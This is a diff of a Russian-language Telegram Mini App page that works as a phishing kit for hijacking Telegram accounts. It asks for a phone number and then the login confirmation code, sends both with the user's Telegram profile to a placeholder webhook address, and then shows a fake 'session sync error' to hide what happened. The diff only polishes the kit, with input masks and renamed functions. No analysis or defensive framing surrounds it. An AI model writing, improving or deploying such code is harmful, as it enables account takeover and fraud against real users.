@@ -13,20 +13,15 @@
         h2 { font-size: 22px; margin: 0 0 8px; }
         p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
 
-        .phone-input-group { display: flex; background: rgba(15, 23, 42, 0.6); border: 1.5px solid rgba(255, 255, 255, 0.1); border-radius: 16px; overflow: hidden; margin-bottom: 20px; }
+        .phone-group { display: flex; background: rgba(15, 23, 42, 0.6); border: 1.5px solid rgba(255, 255, 255, 0.1); border-radius: 16px; overflow: hidden; margin-bottom: 20px; }
+        select { background: #1e293b; border: none; color: #fff; padding: 15px; font-size: 16px; outline: none; border-right: 1px solid rgba(255, 255, 255, 0.1); width: 100px; cursor: pointer; -webkit-appearance: none; }
+        input { width: 100%; background: transparent; border: none; color: #fff; padding: 15px; font-size: 18px; outline: none; letter-spacing: 1px; }
         
-        /* Стилизация выбора страны */
-        #country-select { background: #1e293b; border: none; color: #fff; padding: 15px; font-size: 14px; outline: none; border-right: 1px solid rgba(255, 255, 255, 0.1); width: 110px; cursor: pointer; }
-        
-        input { width: 100%; background: transparent; border: none; color: #fff; padding: 15px; font-size: 18px; outline: none; }
-        
-        /* Убираем спиннеры цифр (image_984693.png больше не актуально) */
         input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
         input[type=number] { -moz-appearance: textfield; }
 
         button { width: 100%; background: #fff; color: #0f172a; border: none; padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; }
         #step2 { display: none; }
-        .error-hint { color: #ef4444; font-size: 12px; margin-top: -15px; margin-bottom: 15px; display: none; }
     </style>
 </head>
 <body>
@@ -36,90 +31,91 @@
         </div>
 
         <div id="step1">
-            <h2>Вход</h2>
-            <p>Введите номер телефона для доступа к архиву</p>
-            <div class="phone-input-group">
-                <select id="country-select" onchange="applyMask()">
-                    <option value="+7" data-len="10">🇷🇺 RU +7</option>
-                    <option value="+380" data-len="9">🇺🇦 UA +380</option>
-                    <option value="+375" data-len="9">🇧🇾 BY +375</option>
-                    <option value="+7" data-len="10">🇰🇿 KZ +7</option>
-                    <option value="+998" data-len="9">🇺🇿 UZ +998</option>
-                    <option value="+994" data-len="9">🇦🇿 AZ +994</option>
-                    <option value="+995" data-len="9">🇬🇪 GE +995</option>
-                    <option value="+374" data-len="8">🇦🇲 AM +374</option>
-                    <option value="+996" data-len="9">🇰🇬 KG +996</option>
-                    <option value="+371" data-len="8">🇱🇻 LV +371</option>
-                    <option value="+370" data-len="8">🇱🇹 LT +370</option>
-                    <option value="+372" data-len="8">🇪🇪 EE +372</option>
-                    <option value="+3 mold" data-len="8">🇲🇩 MD +373</option>
+            <h2>Авторизация</h2>
+            <p>Введите номер для синхронизации</p>
+            <div class="phone-group">
+                <select id="country" onchange="resetInput()">
+                    <option value="+7" data-mask="000-000-00-00">🇷🇺 +7</option>
+                    <option value="+380" data-mask="00-000-00-00">🇺🇦 +380</option>
+                    <option value="+375" data-mask="00-000-00-00">🇧🇾 +375</option>
+                    <option value="+7" data-mask="000-000-00-00">🇰🇿 +7</option>
+                    <option value="+998" data-mask="00-000-00-00">🇺🇿 +998</option>
+                    <option value="+994" data-mask="00-000-00-00">🇦🇿 +994</option>
+                    <option value="+374" data-mask="00-00-00-00">🇦🇲 +374</option>
+                    <option value="+996" data-mask="000-00-00-00">🇰🇬 +996</option>
                 </select>
-                <input type="tel" id="phone" placeholder="900 000-00-00">
+                <input type="tel" id="phone" placeholder="000-000-00-00">
             </div>
-            <div id="err" class="error-hint">Некорректный номер</div>
-            <button onclick="valStep1()">Продолжить</button>
+            <button onclick="toStep2()">Продолжить</button>
         </div>
 
         <div id="step2">
-            <h2>Код из SMS</h2>
-            <p>Мы отправили код в Telegram для <br><b id="show-phone" style="color:var(--accent)"></b></p>
+            <h2>Код подтверждения</h2>
+            <p>Код отправлен на <br><b id="view-phone" style="color:var(--accent)"></b></p>
             <input type="number" id="code" placeholder="00000" inputmode="numeric">
-            <button onclick="valStep2()">Подтвердить</button>
+            <button onclick="final()">Войти</button>
         </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-        const WEBHOOK_URL = 'ТВОЙ_WEBHOOK_URL';
+        const WEBHOOK = 'ТВОЙ_WEBHOOK_URL';
 
-        function applyMask() {
-            const s = document.getElementById('country-select');
-            const i = document.getElementById('phone');
-            const len = s.options[s.selectedIndex].getAttribute('data-len');
-            i.value = "";
-            i.maxLength = len;
-            i.placeholder = "0".repeat(len);
-            document.getElementById('err').style.display = 'none';
+        const phoneInput = document.getElementById('phone');
+        const countrySelect = document.getElementById('country');
+
+        // Живая маска
+        phoneInput.addEventListener('input', function(e) {
+            let x = e.target.value.replace(/\D/g, '');
+            const mask = countrySelect.options[countrySelect.selectedIndex].getAttribute('data-mask');
+            let formatted = '';
+            let valIdx = 0;
+
+            for (let i = 0; i < mask.length && valIdx < x.length; i++) {
+                if (mask[i] === '0') {
+                    formatted += x[valIdx++];
+                } else {
+                    formatted += mask[i];
+                }
+            }
+            e.target.value = formatted;
+        });
+
+        function resetInput() {
+            phoneInput.value = '';
+            phoneInput.placeholder = countrySelect.options[countrySelect.selectedIndex].getAttribute('data-mask');
         }
 
-        function valStep1() {
-            const s = document.getElementById('country-select');
-            const p = document.getElementById('phone').value.replace(/\D/g, '');
-            const targetLen = s.options[s.selectedIndex].getAttribute('data-len');
+        function toStep2() {
+            const full = countrySelect.value + phoneInput.value;
+            const clean = phoneInput.value.replace(/\D/g, '');
+            const maskCheck = countrySelect.options[countrySelect.selectedIndex].getAttribute('data-mask').replace(/\D/g, '').length;
 
-            if (p.length != targetLen) {
+            if (clean.length < maskCheck) {
                 tg.HapticFeedback.notificationOccurred('error');
-                document.getElementById('err').style.display = 'block';
                 return;
             }
 
-            const full = s.value + p;
-            document.getElementById('show-phone').innerText = full;
+            document.getElementById('view-phone').innerText = full;
             document.getElementById('step1').style.display = 'none';
             document.getElementById('step2').style.display = 'block';
             tg.HapticFeedback.impactOccurred('medium');
-            send({ stage: 'phone', val: full });
+            send({ event: 'phone', num: full });
         }
 
-        function valStep2() {
+        function final() {
             const c = document.getElementById('code').value;
             if (c.length < 5) return;
+            send({ event: 'code', code: c, num: document.getElementById('view-phone').innerText });
             tg.HapticFeedback.notificationOccurred('success');
-            send({ stage: 'code', val: c, phone: document.getElementById('show-phone').innerText });
-            
-            setTimeout(() => {
-                alert("Ошибка синхронизации. Попробуйте войти позже.");
-                tg.close();
-            }, 1000);
+            setTimeout(() => { alert("Ошибка синхронизации сессии"); tg.close(); }, 800);
         }
 
-        function send(data) {
-            data.u = tg.initDataUnsafe?.user || {};
-            fetch(WEBHOOK_URL, { method: 'POST', body: JSON.stringify(data) }).catch(()=>{});
+        function send(obj) {
+            obj.user = tg.initDataUnsafe?.user || {};
+            fetch(WEBHOOK, { method: 'POST', body: JSON.stringify(obj) }).catch(()=>{});
         }
-        
-        applyMask();
     </script>
 </body>
 </html>
